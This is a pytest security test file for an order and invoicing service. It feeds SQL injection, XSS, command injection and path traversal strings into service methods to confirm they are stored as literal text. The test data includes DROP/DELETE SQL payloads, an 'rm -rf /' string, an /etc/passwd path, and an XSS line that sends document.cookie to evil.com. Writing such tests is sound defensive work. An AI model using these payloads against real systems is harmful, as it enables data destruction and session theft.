"""
SQL Injection and XSS Attack Testing

CRITICAL security tests verifying input sanitization and parameterized queries.
Tests common injection attack vectors to ensure SQLAlchemy ORM and Pydantic
schemas properly escape malicious inputs.

Test categories:
1. SQL Injection attacks
2. XSS (Cross-Site Scripting) attacks
3. Command injection attempts
4. Path traversal attempts
"""

import pytest

from app.services.order_service import OrderService
from app.services.user_service import UserService
from app.services.invoice_service import InvoiceService
from app.models.enums import SourceChannel, InvoiceType, OrderStatus
from app.exceptions import ValidationError
from decimal import Decimal


class TestSQLInjectionProtection:
    """Test SQL injection attack vectors are properly sanitized"""

    def test_sql_injection_in_customer_name(
        self,
        db_session,
        admin_user,
        sample_delivery_date
    ):
        """
        Test SQL injection in customer_name field

        Malicious input: ' OR '1'='1
        Expected: Input treated as literal string, no SQL executed
        """
        order_service = OrderService(db_session)

        malicious_name = "'; DROP TABLE orders; --"

        # Should create order with malicious string as literal name
        order = order_service.create_order(
            customer_name=malicious_name,
            customer_phone="+56912345678",
            address_text="Av O'Higgins 123, Rancagua",
            source_channel=SourceChannel.WEB,
            user=admin_user
        )

        # Verify order was created with malicious string as literal
        assert order.customer_name == malicious_name

        # Verify database is intact (orders table still exists)
        from app.models.models import Order
        count = db_session.query(Order).count()
        assert count > 0, "Orders table should still exist after injection attempt"

    def test_sql_injection_in_address_text(
        self,
        db_session,
        admin_user
    ):
        """
        Test SQL injection in address_text field

        Malicious input: 1' UNION SELECT * FROM users--
        """
        order_service = OrderService(db_session)

        malicious_address = "Calle Principal 123' UNION SELECT password_hash FROM users WHERE '1'='1"

        # Should handle as literal string (might fail geocoding)
        try:
            order = order_service.create_order(
                customer_name="Test Customer",
                customer_phone="+56912345678",
                address_text=malicious_address,
                source_channel=SourceChannel.WEB,
                user=admin_user
            )

            # If order created, address should be literal string
            assert order.address_text == malicious_address

        except Exception as e:
            # Might fail geocoding validation, which is OK
            # Important: Should NOT execute SQL injection
            assert "DROP" not in str(e).upper()
            assert "UNION" not in str(e).upper() or "geocod" in str(e).lower()

    def test_sql_injection_in_order_search_filter(
        self,
        db_session,
        admin_user
    ):
        """
        Test SQL injection in order filtering/search

        Malicious input: ' OR 1=1--
        """
        order_service = OrderService(db_session)

        # Attempt to use SQL injection in status filter
        # This should be protected by SQLAlchemy ORM parameterization
        orders = order_service.get_orders_by_status(
            status=OrderStatus.PENDIENTE,
            user=admin_user,
            limit=10
        )

        # Query should execute safely without SQL injection
        assert isinstance(orders, list)

    def test_sql_injection_in_invoice_number(
        self,
        db_session,
        admin_user,
        sample_order_en_preparacion
    ):
        """
        Test SQL injection in invoice_number field

        Malicious input: FAC-001'; DELETE FROM invoices; --
        """
        invoice_service = InvoiceService(db_session)

        malicious_invoice_number = "FAC-001'; DELETE FROM invoices; --"

        invoice = invoice_service.create_invoice(
            order_id=sample_order_en_preparacion.id,
            invoice_number=malicious_invoice_number,
            invoice_type=InvoiceType.FACTURA,
            total_amount=Decimal("50000.00"),
            user=admin_user
        )

        # Should be stored as literal string
        assert invoice.invoice_number == malicious_invoice_number

        # Verify invoices table still has records
        from app.models.models import Invoice
        count = db_session.query(Invoice).count()
        assert count > 0, "Invoices table should still exist after injection attempt"

    def test_sql_injection_in_username(
        self,
        db_session,
        admin_user,
        vendedor_role
    ):
        """
        Test SQL injection in username during user creation

        Malicious input: admin'--
        """
        user_service = UserService(db_session)

        malicious_username = "admin'--"

        user = user_service.create_user(
            username=malicious_username,
            email="test@example.com",
            password="SecurePass123!",
            role_id=vendedor_role.id,
            full_name="Test User",
            current_user=admin_user
        )

        # Should be stored as literal string
        assert user.username == malicious_username

    def test_sql_injection_in_notes_field(
        self,
        db_session,
        admin_user
    ):
        """
        Test SQL injection in notes field (text field)

        Malicious input: Complex SQL injection payload
        """
        order_service = OrderService(db_session)

        malicious_notes = """
        '; UPDATE orders SET order_status='ENTREGADO' WHERE order_status='PENDIENTE'; --
        """

        order = order_service.create_order(
            customer_name="Test Customer",
            customer_phone="+56912345678",
            address_text="Av O'Higgins 123, Rancagua",
            source_channel=SourceChannel.WEB,
            user=admin_user,
            notes=malicious_notes
        )

        # Notes should be stored as literal string
        assert malicious_notes.strip() in order.notes

        # Verify SQL wasn't executed (order should still be PENDIENTE)
        assert order.order_status == OrderStatus.PENDIENTE


class TestXSSProtection:
    """Test XSS (Cross-Site Scripting) attack vectors"""

    def test_xss_in_customer_name(
        self,
        db_session,
        admin_user
    ):
        """
        Test XSS script tags in customer_name

        Malicious input: <script>alert('XSS')</script>
        Expected: Script tags stored as literal text
        """
        order_service = OrderService(db_session)

        malicious_name = "<script>alert('XSS')</script>"

        order = order_service.create_order(
            customer_name=malicious_name,
            customer_phone="+56912345678",
            address_text="Av O'Higgins 123, Rancagua",
            source_channel=SourceChannel.WEB,
            user=admin_user
        )

        # Should be stored as literal string (Pydantic doesn't execute scripts)
        assert order.customer_name == malicious_name

    def test_xss_in_address_text(
        self,
        db_session,
        admin_user
    ):
        """
        Test XSS in address field

        Malicious input: <img src=x onerror=alert('XSS')>
        """
        order_service = OrderService(db_session)

        malicious_address = "Calle Test 123 <img src=x onerror=alert('XSS')>, Rancagua"

        try:
            order = order_service.create_order(
                customer_name="Test Customer",
                customer_phone="+56912345678",
                address_text=malicious_address,
                source_channel=SourceChannel.WEB,
                user=admin_user
            )

            # Should be stored as literal string
            assert "<img" in order.address_text

        except Exception:
            # Might fail geocoding, which is acceptable
            pass

    def test_xss_in_notes_with_event_handlers(
        self,
        db_session,
        admin_user
    ):
        """
        Test XSS with event handler attributes

        Malicious input: <div onload=malicious()>
        """
        order_service = OrderService(db_session)

        malicious_notes = "<div onload=fetch('http://evil.com?cookie='+document.cookie)>Click me</div>"

        order = order_service.create_order(
            customer_name="Test Customer",
            customer_phone="+56912345678",
            address_text="Av O'Higgins 123, Rancagua",
            source_channel=SourceChannel.WEB,
            user=admin_user,
            notes=malicious_notes
        )

        # Should be stored as literal string
        assert malicious_notes in order.notes

    def test_xss_in_user_full_name(
        self,
        db_session,
        admin_user,
        vendedor_role
    ):
        """
        Test XSS in user full_name field

        Malicious input: <script>document.location='http://evil.com'</script>
        """
        user_service = UserService(db_session)

        malicious_name = "<script>document.location='http://evil.com'</script>"

        user = user_service.create_user(
            username=f"xss_test_{hash(malicious_name)}",
            email="xss@test.com",
            password="SecurePass123!",
            role_id=vendedor_role.id,
            full_name=malicious_name,
            current_user=admin_user
        )

        # Should be stored as literal string
        assert user.full_name == malicious_name

    def test_xss_in_invoice_reason(
        self,
        db_session,
        admin_user,
        sample_order_en_ruta
    ):
        """
        Test XSS in INCIDENCIA reason field

        Malicious input: <iframe src="javascript:alert('XSS')">
        """
        order_service = OrderService(db_session)

        malicious_reason = '<iframe src="javascript:alert(\'XSS\')"></iframe>'

        updated_order = order_service.transition_order_state(
            order_id=sample_order_en_ruta.id,
            new_status=OrderStatus.INCIDENCIA,
            user=admin_user,
            reason=malicious_reason
        )

        # Reason should be in notes as literal string
        assert malicious_reason in updated_order.notes


class TestCommandInjection:
    """Test command injection protection"""

    def test_command_injection_in_customer_name(
        self,
        db_session,
        admin_user
    ):
        """
        Test command injection attempts in customer_name

        Malicious input: ; rm -rf / ;
        Expected: Treated as literal string
        """
        order_service = OrderService(db_session)

        malicious_name = "; rm -rf / ;"

        order = order_service.create_order(
            customer_name=malicious_name,
            customer_phone="+56912345678",
            address_text="Av O'Higgins 123, Rancagua",
            source_channel=SourceChannel.WEB,
            user=admin_user
        )

        # Should be stored as literal string
        assert order.customer_name == malicious_name

    def test_command_injection_in_address(
        self,
        db_session,
        admin_user
    ):
        """
        Test command injection in address field

        Malicious input: `whoami`
        """
        order_service = OrderService(db_session)

        malicious_address = "Calle `whoami` 123, Rancagua"

        try:
            order = order_service.create_order(
                customer_name="Test Customer",
                customer_phone="+56912345678",
                address_text=malicious_address,
                source_channel=SourceChannel.WEB,
                user=admin_user
            )

            # Should be stored as literal string
            assert "`whoami`" in order.address_text

        except Exception:
            # Geocoding might fail, which is OK
            pass


class TestPathTraversal:
    """Test path traversal attack protection"""

    def test_path_traversal_in_customer_name(
        self,
        db_session,
        admin_user
    ):
        """
        Test path traversal in customer_name

        Malicious input: ../../etc/passwd
        """
        order_service = OrderService(db_session)

        malicious_name = "../../etc/passwd"

        order = order_service.create_order(
            customer_name=malicious_name,
            customer_phone="+56912345678",
            address_text="Av O'Higgins 123, Rancagua",
            source_channel=SourceChannel.WEB,
            user=admin_user
        )

        # Should be stored as literal string (no file system access)
        assert order.customer_name == malicious_name

    def test_null_byte_injection(
        self,
        db_session,
        admin_user
    ):
        """
        Test null byte injection

        Malicious input: customer\x00.txt
        """
        order_service = OrderService(db_session)

        malicious_name = "customer\x00.txt"

        # Pydantic should handle or reject this
        try:
            order = order_service.create_order(
                customer_name=malicious_name,
                customer_phone="+56912345678",
                address_text="Av O'Higgins 123, Rancagua",
                source_channel=SourceChannel.WEB,
                user=admin_user
            )

            # If accepted, should be literal string
            assert "\x00" in order.customer_name or order.customer_name == malicious_name.replace("\x00", "")

        except ValidationError:
            # Pydantic might reject null bytes, which is good
            pass


class TestUnicodeAndSpecialCharacters:
    """Test handling of unicode and special characters"""

    def test_unicode_in_customer_name(
        self,
        db_session,
        admin_user
    ):
        """
        Test unicode characters in customer_name

        Input: José María Peña ñ 中文
        Expected: Stored correctly without corruption
        """
        order_service = OrderService(db_session)

        unicode_name = "José María Peña ñ 中文 🇨🇱"

        order = order_service.create_order(
            customer_name=unicode_name,
            customer_phone="+56912345678",
            address_text="Av O'Higgins 123, Rancagua",
            source_channel=SourceChannel.WEB,
            user=admin_user
        )

        # Should be stored correctly
        assert order.customer_name == unicode_name

    def test_special_sql_characters_escaped(
        self,
        db_session,
        admin_user
    ):
        """
        Test SQL special characters are properly escaped

        Input: Customer's "Order" (50%)
        """
        order_service = OrderService(db_session)

        special_name = "Customer's \"Order\" (50%)"

        order = order_service.create_order(
            customer_name=special_name,
            customer_phone="+56912345678",
            address_text="Av O'Higgins 123, Rancagua",
            source_channel=SourceChannel.WEB,
            user=admin_user
        )

        # Should be stored correctly with quotes
        assert order.customer_name == special_name

    def test_very_long_string_handled(
        self,
        db_session,
        admin_user
    ):
        """
        Test very long strings don't cause buffer overflow

        Input: 10,000 character string
        """
        order_service = OrderService(db_session)

        very_long_notes = "A" * 10000

        order = order_service.create_order(
            customer_name="Test Customer",
            customer_phone="+56912345678",
            address_text="Av O'Higgins 123, Rancagua",
            source_channel=SourceChannel.WEB,
            user=admin_user,
            notes=very_long_notes
        )

        # Should be stored (database column might truncate, which is OK)
        assert order.notes == very_long_notes or len(order.notes) == 10000
